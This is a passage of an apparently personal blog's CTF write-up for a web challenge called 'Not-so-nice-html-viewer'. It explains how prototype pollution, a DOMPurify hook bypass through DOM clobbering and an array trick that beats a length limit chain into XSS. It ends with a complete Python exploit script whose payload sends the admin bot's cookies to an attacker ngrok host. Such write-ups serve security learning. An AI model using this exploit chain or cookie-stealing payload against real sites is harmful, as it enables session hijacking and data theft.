+    asyncio.run(main())
+</code></pre>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-11.png"><br><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-12.png"><br><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-13.png"></p>
+<h1 id="Not-so-nice-html-viewer"><a href="#Not-so-nice-html-viewer" class="headerlink" title="Not-so-nice-html-viewer"></a>Not-so-nice-html-viewer</h1><p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-14.png"></p>
+<p>In this challenge, an admin bot visits any legitimate HTTP or HTTPS URL. The target flag is located inside the bot’s document cookie, meaning we must achieve reliable Cross-Site Scripting (XSS).</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-15.png"></p>
+<p>The target web application is minimal, comprised entirely of <code>index.html</code>, <code>main.js</code>, and <code>purify.min.js</code>.</p>
+<p>Code inspection of <code>main.js</code> reveals a clear <strong>Prototype Pollution</strong> vulnerability. The script parses incoming configurations out of the URL hash using the <code>decodeHashPayload()</code> function, before merging it into the application scope.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-16.png"></p>
+<p>User input is captured explicitly from the URL fragment identifier (hash) (e.g., <code>http://web.com?test#user_input</code>). The application URL-decodes, base64-decodes, and subsequently evaluates the payload via <code>JSON.parse()</code>. This data flow permits us to modify standard JavaScript object properties globally.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-17.png"></p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-18.png"></p>
+<p>Furthermore, the application registers an event listener to monitor modifications to the hash parameter. Changing the location string from <code>http://web.com#base64_1</code> to <code>http://web.com#base64_2</code> fires lines 383–393, passing our parsed payload structure directly into <code>renderHtml()</code>.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-19.png"></p>
+<p>The <code>renderHtml()</code> function is the primary source of the XSS vulnerability. Our input payload undergoes sanitization before it is loaded into the <code>srcdoc</code> attribute of a sandboxed <code>iframe</code>. Interestingly, look closely at the invocation: <code>setAttributes(iframe, {...SAFE_IFRAME_ATTRS})</code>.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-20.png"></p>
+<p>The loop structure iterates using the syntax: <code>for(const attr in attrs)</code>.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-21.png"></p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-22.png"></p>
+<p>Because a <code>for...in</code> loop traverses inherited prototype properties, any element added via prototype pollution will be evaluated and written as an explicit HTML attribute on the iframe tag. Although the block filters out common event handlers beginning with <code>on...</code> and source attributes matching <code>src...</code>, other structural properties remain exposed.</p>
+<p>Our initial exploitation path is to overwrite the iframe’s <code>sandbox</code> constraints with relaxed parameters: <code>"allow-scripts allow-same-origin allow-top-navigation"</code>. This adjustments allows the isolated page context to execute scripts, query parent context cookies, and perform window redirections.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-23.png"></p>
+<p>Testing confirms this approach successfully modifies the iframe environment.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-24.png"></p>
+<p>Next, we must find a method to circumvent DOMPurify’s sanitization routine.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-25.png"></p>
+<p>Research into native library misconfigurations highlights a flaw within custom DOMPurify hook setups (Reference: <a target="_blank" rel="noopener" href="https://www.google.com/search?q=https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations%23beforeSanitizeAttributes-manipulation">Mizu’s DOMPurify Hook Exploitation Analysis</a>).</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-26.png"></p>
+<p>When a custom hook utilizes a pattern structured like the one below, the document tree becomes susceptible to bypasses via <strong>DOM Clobbering</strong>.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-27.png"></p>
+<p>If we define the hook configuration as follows:<br><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-28.png"></p>
+<p>We can structure our corresponding evasion payload like this:<br><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-29.png"></p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-30.png"></p>
+<p>By abusing DOM Clobbering, our hidden payload manages to pass clean verification checks.</p>
+<p>The application source code dynamically changes element identifiers into a formatted hexadecimal string: <code>randomhex-id</code> (ranging across values from <code>000</code> to <code>fff</code>).</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-31.png"></p>
+<p>To reliably exploit this variable naming structure, we can generate a dense array of input nodes covering every possible combination: <code>&lt;input form=”000-x” id=attributes&gt;, &lt;input form=”001-x” id=attributes&gt;, …, &lt;input form=”fff-x” id=attributes&gt;</code>. This ensures one of our inputs aligns cleanly with the rewritten host form ID.</p>
+<p>However, brute-forcing all hex combinations inflates the code length dramatically. The server enforces a strict maximum cap of 255 characters on our raw HTML payloads. We need to construct a workaround to bypass this restriction.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-32.png"></p>
+<h2 id="Exploit-Sequence-Blueprint"><a href="#Exploit-Sequence-Blueprint" class="headerlink" title="Exploit Sequence Blueprint"></a>Exploit Sequence Blueprint</h2><ol>
+<li>The admin bot visits our attacker-controlled web node.</li>
+<li>Our page invokes <code>window.open()</code> to start the target application window, supplying an initial configuration parameters (<code>PAYLOAD1</code>).</li>
+</ol>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-33.png"></p>
+<p>During execution of <code>PAYLOAD1</code>, the <code>html</code> container is left completely empty. However, the execution process triggers a prototype pollution configuration merge, introducing the global property <code>"html": "test"</code>.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-34.png"></p>
+<p>Consequently, the rendering mechanism triggers execution using our polluted prototype content string.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-35.png"></p>
+<p>Once the target browser context initializes, we update the location reference hash value directly from our attacker script (<code>PAYLOAD2</code>):</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-36.png"></p>
+<p><em>(The <code>generate_permutations_of_3_chars</code> loop creates the large sequence of input tags spanning from <code>000</code> to <code>fff</code>).</em></p>
+<p><strong>Critical Observation:</strong> Notice that the assigned <code>"html"</code> parameter is passed as an <strong>Array</strong> structure, rather than a conventional string primitives.</p>
+<p>When the target location changes, <code>decodeHashPayload()</code> runs. Because our raw HTML data structure resides within an unmerged configuration array, it evades initial string-length restrictions. The routine then transitions into executing <code>mergeConfig()</code>.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-37.png"></p>
+<p>The <code>mergeConfig()</code> function subsequently relies on internal helper functions <code>writeConfig()</code> and <code>sanitizeValue()</code>.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-39.png"></p>
+<p>Here, the input validator checks independent nested elements inside array types sequentially, demanding only that individual items remain under a 256-character length boundary.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-40.png"></p>
+<p>By assuring every structural component of the permutation string stays under this constraint, the payload safely circumvents the verification block. When JavaScript interfaces array objects inside string operations, it implicitly joins the items into a uniform comma-delimited string. Once <code>mergeConfig()</code> completes, <code>newPayload.html</code> references the expanded text output from our controlled object prototype chain.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-41.png"></p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-42.png"></p>
+<p>Below is the automated exploit orchestration script:</p>
+<pre><code class="language-python">from flask import Flask
+import threading
+import requests
+
+# ==== CHANGE ME
+URL = "[http://ctf.cyberjawara.id:42313](http://ctf.cyberjawara.id:42313)"
+ATTACKER_URL = "[http://6.tcp.ngrok.io:10731](http://6.tcp.ngrok.io:10731)"
+# ==== CHANGE ME
+
+app = Flask(__name__)
+
+def generate_permutations_of_3_chars(charset="0123456789abcdef"):
+    import itertools
+    permutations = [ f'&lt;input form="{f"{""}".join(cs)}-x" id="attributes"&gt;' for cs in itertools.product(charset, repeat=3)]
+    return permutations
+
+def encode_payload(payload):
+    from base64 import b64encode
+    import json
+    encoded = b64encode(json.dumps(payload).encode()).decode()
+    return encoded
+
+payload1 = encode_payload({
+    "config": {
+        "autoRender": True,
+        "__proto__": {
+            "sandbox": [
+                "allow-scripts allow-same-origin allow-top-navigation"
+                ],
+            "html": "test"
+            }
+        }
+    })
+
+XSS_PAYLOAD = '''&lt;form id="x" oncontentvisibilityautostatechange="top.parent.window.location.href=`ATTACKER_URL/flegggg?${document.cookie}`" style=display:block;content-visibility:auto&gt;&lt;/form&gt;'''.replace("ATTACKER_URL", ATTACKER_URL)
+payload2 = encode_payload({
+    "config":{
+        "autoRender": True,
+        "__proto__":{
+            "html": [XSS_PAYLOAD] + generate_permutations_of_3_chars(),
+            }
+        }
+    })
+
+@app.route("/", methods=["GET"])
+def index():
+    return """
+&lt;script&gt;
+let w = open('http://proxy/#PAYLOAD1HERE')
+let sleep = (ms) =&gt; new Promise((resolve) =&gt; setTimeout(resolve, ms));
+(async () =&gt; {
+    await sleep(2000);
+    w.location = 'http://proxy/#PAYLOAD2HERE'
+})();
+&lt;/script&gt;
+""".replace("PAYLOAD1HERE", payload1).replace("PAYLOAD2HERE", payload2)
+
+if __name__ == "__main__":
+    threading.Thread(target=app.run, args=("0.0.0.0", 4444)).start()
+    res = requests.post(URL + "/report/", data={"url": ATTACKER_URL})
+    print(res.text)
+</code></pre>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-43.png"></p>
+<pre><code>
+</code></pre>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> Please cite the source when reposting. Readers are welcome to verify the references cited in the article and point out any errors or unclear expressions. </span>
+    </div>
+</article>
+
+
+
+
+
+    <div id="comments">
+    <script>
+        {
+            const comments = document.getElementById("comments");
+            const script = document.createElement("script");
+            script.src = "https://giscus.app/client.js";
+            script.setAttribute('data-repo', "TanKnight7/TanKnight7.github.io");
+            script.setAttribute('data-repo-id', "R_kgDOOxOm1A");
+            script.setAttribute('data-category', "General");
+            script.setAttribute('data-category-id', "DIC_kwDOOxOm1M4DBH1f");
+            script.setAttribute('data-mapping', "pathname");
+            script.setAttribute('data-strict', "0");
+            script.setAttribute('data-reactions-enabled', "1");
+            script.setAttribute('data-emit-metadata', "1");
+            script.setAttribute('data-input-position', "top");
+            script.setAttribute('data-theme', "light");
+            script.setAttribute('data-lang', "en");
+            script.setAttribute('data-loading', "lazy");
+            script.setAttribute('crossorigin', "anonymous");
+            script.setAttribute('async', "");
+            comments.appendChild(script);
+        }
+    </script>
+</div>
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2026 Tanknight
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
